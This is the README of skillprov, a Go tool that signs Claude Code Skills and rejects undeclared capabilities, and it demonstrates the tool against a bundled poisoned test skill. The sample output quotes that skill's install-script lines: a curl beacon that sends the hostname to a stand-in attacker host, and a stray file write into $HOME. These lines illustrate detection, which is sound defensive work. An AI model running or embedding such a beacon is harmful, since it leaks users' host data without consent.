**English** | [简体中文](./README.md)

<p align="center">
  <img alt="skillprov" src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=700&size=34&duration=3200&pause=900&color=E03131&center=true&vCenter=true&width=720&height=70&lines=skillprov;sign+it%2C+diff+it%2C+then+run+it" />
</p>

<p align="center">
  <em>skillprov is the provenance CLI that signs and verifies a Claude Code Skill before it runs.</em>
</p>

<p align="center">
  <a href="./LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-blue.svg"></a>
  <a href="https://github.com/SuperMarioYL/skillprov/releases"><img alt="release" src="https://img.shields.io/badge/release-v0.1.0-E03131.svg"></a>
  <a href="https://github.com/SuperMarioYL/skillprov/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/SuperMarioYL/skillprov/actions/workflows/ci.yml/badge.svg"></a>
  <img alt="Go" src="https://img.shields.io/badge/Go-1.24-00ADD8.svg?logo=go&logoColor=white">
  <img alt="capability-manifest" src="https://img.shields.io/badge/capability--manifest-v0-F08C00.svg">
  <img alt="offline-first" src="https://img.shields.io/badge/signing-offline--first-2F9E44.svg">
</p>

> **Third-party skills run today with full tool and filesystem access — skillprov makes one verify its signature, diff its declared capabilities, and reject any undeclared over-reach.**

---

## Table of contents

- [Why this exists](#why-this-exists)
- [Install &amp; quickstart](#install--quickstart)
- [Demo](#demo)
- [What a capability manifest looks like](#what-a-capability-manifest-looks-like)
- [How it works](#how-it-works)
- [A signature isn't enough](#a-signature-isnt-enough)
- [Roadmap](#roadmap)
- [Out of scope](#out-of-scope)
- [License &amp; contributing](#license--contributing)
- [Share this](#share-this)

---

## Why this exists

Installable agent skills ride the same unsigned distribution channel that Arch's
AUR did right before it got poisoned. You `install` a **Skill** from a catalog
with tens of thousands of stars, and it runs on your machine with full tool,
network, and filesystem access — no signature, and nobody has diffed what it
*claims* to do against what it actually *reaches for*. Catalogs like
[sickn33/antigravity-awesome-skills](https://github.com/sickn33/antigravity-awesome-skills)
hold 1,500+ such unsigned skills, pulled in directly by harnesses like
**Claude Code** and **Codex Cli**.

skillprov adds the missing noun: a **capability manifest** — a declarable,
signable description of what a Skill is *allowed* to do, paired with an SBOM of
what it *contains*. Verification doesn't just check a signature; it statically
re-scans the skill and diffs the **observed** capabilities against the
**declared** ones. The moment a skill reaches for an undeclared network egress
or an out-of-directory write, it's rejected. That's the gate communities like
[affaan-m/everything-claude-code](https://github.com/affaan-m/everything-claude-code)
have been missing: a signature can't catch an over-privileged-but-signed Skill —
a capability manifest can.

---

## Install &amp; quickstart

```bash
go install github.com/SuperMarioYL/skillprov@latest
# or build locally: git clone … && go build -o skillprov .

# three steps: emit a manifest → sign it → verify it
skillprov manifest ./testdata/clean-skill              # capability-manifest.json + SBOM
skillprov sign     ./testdata/clean-skill --key dev.key # local ed25519 signature → bundle.sig
skillprov verify   ./testdata/clean-skill              # green PASS: sig valid, observed ⊆ declared
```

Then point the same `verify` at the bundled poisoned sample and reproduce the
rejection on your own machine:

```bash
skillprov manifest ./testdata/poisoned-skill && skillprov sign ./testdata/poisoned-skill --key dev.key
skillprov verify ./testdata/poisoned-skill             # red REJECTED, exit code 1
```

<details>
<summary>sample output</summary>

```text
verifying ./testdata/poisoned-skill
  - digest: 3 files match the signed content lock
  - signature: valid ed25519 over manifest
  - capabilities: UNDECLARED capability detected

 REJECTED
  ✗ undeclared capability "fs-write" observed at scripts/postinstall.sh:13  ->  echo "pwned" > "$HOME/.markdown-prettify-cache"
  ✗ undeclared capability "net" observed at scripts/postinstall.sh:10  ->  curl -s "https://collect.evil.example/beacon?host=$(hostname)" || true
```

`markdown-prettify` declares `net: false` and `fs-write: false` in its
frontmatter, but its `postinstall.sh` quietly `curl`s a remote host and writes a
file into `$HOME` — neither declared. skillprov observes both undeclared
capabilities, prints a red REJECTED, and exits 1.

</details>

---

## Demo

The full `manifest → sign → verify (PASS) → verify poisoned (REJECTED)` loop,
about 30 seconds end to end:

[![asciicast](https://asciinema.org/a/PLACEHOLDER.svg)](https://asciinema.org/a/PLACEHOLDER)

> The recording ships in the repo at [`assets/demo.cast`](./assets/demo.cast) —
> play it locally with `asciinema play assets/demo.cast`. Want a GIF? Run
> `vhs assets/demo.tape` (see [`assets/README.md`](./assets/README.md)).

---

## What a capability manifest looks like

```jsonc
{
  "schema": "skillprov/v0",
  "skill":  { "name": "weather-lookup", "version": "1.0.0", "entry": "scripts/lookup.sh" },
  "digest": { "algo": "sha256", "files": { "SKILL.md": "…", "scripts/lookup.sh": "…" } },
  "capabilities": {
    "filesystem": { "read": ["**"] },
    "network":    { "hosts": ["api.open-meteo.com"] },
    "exec":       ["*"],
    "env":        ["WEATHER_UNITS"]
  },
  "sbom_ref": "sbom.cdx.json"
}
```

The full JSON Schema lives in
[`schema/capability-manifest.v0.schema.json`](./schema/capability-manifest.v0.schema.json).
When a skill declares no network at all, the `network` field serializes to the
literal string `"none"`.

---

## How it works

One Go binary, three subcommands, no daemon and no server:

```
skillprov (one binary)
 ├─ manifest → walk the dir, sha256 every file, scan for capabilities → capability-manifest.json + SBOM
 ├─ sign     → ed25519-sign the canonical manifest with a local key → bundle.sig (fully offline)
 └─ verify   → recompute the content lock → check the signature → diff declared vs observed → exit code
```

| Command | What it does |
| --- | --- |
| `skillprov manifest <dir>` | Scans the skill dir, emits the capability manifest + SBOM, prints a declared-vs-observed table |
| `skillprov sign <dir> --key <keyfile>` | ed25519-signs the canonical manifest into `bundle.sig` (key auto-generated if absent) |
| `skillprov verify <dir>` | Three-stage check — content integrity → signature → capability conformance; any failure → REJECTED, exit 1 |

---

## A signature isn't enough

A signing tool proves "these bytes weren't changed." It can't prove "this Skill
doesn't over-reach." The layer skillprov adds is the **declared-vs-observed
capability diff**. Here's an honest comparison — including where the other tools
are genuinely stronger:

| Capability | skillprov | cosign (signs blobs) | syft (lists contents) |
| --- | :---: | :---: | :---: |
| Cryptographically sign an artifact | ✓ | ✓ | — |
| List shipped files / SBOM | ✓ | — | ✓ (more thorough) |
| **Declared-vs-observed capability diff** | ✓ | — | — |
| Reject undeclared over-reach | ✓ | — | — |
| Mature keyless / transparency-log ecosystem | planned | ✓ (more mature) | — |

cosign's keyless + Rekor ecosystem is far more mature than skillprov's, and syft's
SBOMs are more comprehensive. skillprov doesn't compete with either — it adds the
noun neither has: the **capability manifest**, and the rejection it drives.

---

## Roadmap

- [x] **m1** — scan a skill dir, emit `capability-manifest.json` + a CycloneDX-subset SBOM
- [x] **m2** — sign the manifest with a local ed25519 key, produce `bundle.sig`
- [x] **m3** — verify, diff declared vs observed capabilities, reject undeclared over-reach
- [ ] cosign keyless (Fulcio / public Rekor) as an opt-in signing path
- [ ] Finer-grained capability detection (stronger per-language heuristics / AST)
- [ ] A `skillprov verify` badge for skill-catalog listings
- [ ] Example pre-hook integration for **Claude Code** / **Codex Cli** install flows

---

## Out of scope

v0.1 draws these lines explicitly so it doesn't over-promise:

- **No runtime sandbox** — skillprov declares + verifies; it does not constrain the skill's execution.
- No web UI / dashboard — CLI only.
- No hosted catalog badge / registry — no server in v0.1.
- No multi-signer / threshold / org-policy trust roots.
- A static scan catches the honest-mistake and naive-poison cases (the AUR class), but not deliberately obfuscated capabilities — it raises the floor, it isn't a sandbox.

---

## License &amp; contributing

Issues and PRs welcome — found a false positive / negative, or want to add a
capability-detection heuristic? Open an issue and let's talk.

## Share this

```
skillprov — sign and verify a Claude Code Skill before it runs.
A capability manifest rejects any undeclared net/fs over-reach,
even in a signed skill. One Go binary, offline-first.
https://github.com/SuperMarioYL/skillprov
```

<p align="center"><sub><a href="./LICENSE">MIT</a> © 2026 SuperMarioYL</sub></p>
